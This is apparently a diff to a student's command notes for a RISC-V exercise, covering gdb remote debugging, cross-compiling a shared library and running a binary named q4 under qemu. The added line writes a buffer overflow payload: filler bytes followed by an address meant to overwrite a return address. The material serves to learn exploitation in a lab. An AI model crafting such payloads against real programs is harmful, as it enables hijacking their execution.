@@ -17,3 +17,5 @@ target remote :1234
 riscv64-linux-gnu-gcc -fPIC -shared add.c -o libadd.so
 
 qemu-riscv64 -L /usr/riscv64-linux-gnu/ ./q4 < input.txt 
+
+printf 'qwxytgfrqwxytgfrqwxytgfrqwxytgfrqwxytgfrqwxytgfrqwxytgfrqwxytgfrqwxytgfrqwxytgfrqwxytgfrqwxytgfrqwxytgfrqwxytgfrqwxytgfrqwxytgfrqwxytgfrqwxytgfrqwxytgfr\xe8\x04\x01\x00\x00\x00\x00\x00' > payload
